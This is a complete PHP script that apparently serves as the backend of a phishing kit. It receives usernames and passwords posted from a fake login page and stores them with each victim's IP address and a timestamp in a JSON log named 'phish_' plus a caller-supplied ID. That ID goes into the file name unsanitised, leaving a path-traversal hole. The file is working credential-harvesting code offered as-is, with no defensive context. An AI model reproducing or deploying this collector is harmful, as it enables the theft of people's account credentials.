<?php
header('Content-Type: application/json');
date_default_timezone_set('Europe/Istanbul');

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $uid = $data['uid'] ?? 'yvx01';
    $logFile = 'phish_' . $uid . '.json';
    
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

    if(!file_exists($logFile)) file_put_contents($logFile, json_encode([]));
    $currentLogs = json_decode(file_get_contents($logFile), true);

    $newEntry = [
        "user" => $data['user'] ?? "-",
        "pass" => $data['pass'] ?? "-",
        "ip" => $ip,
        "time" => date('d.m.Y H:i:s')
    ];

    array_push($currentLogs, $newEntry);
    file_put_contents($logFile, json_encode($currentLogs));
    echo json_encode(["status" => "ok"]);
}
?>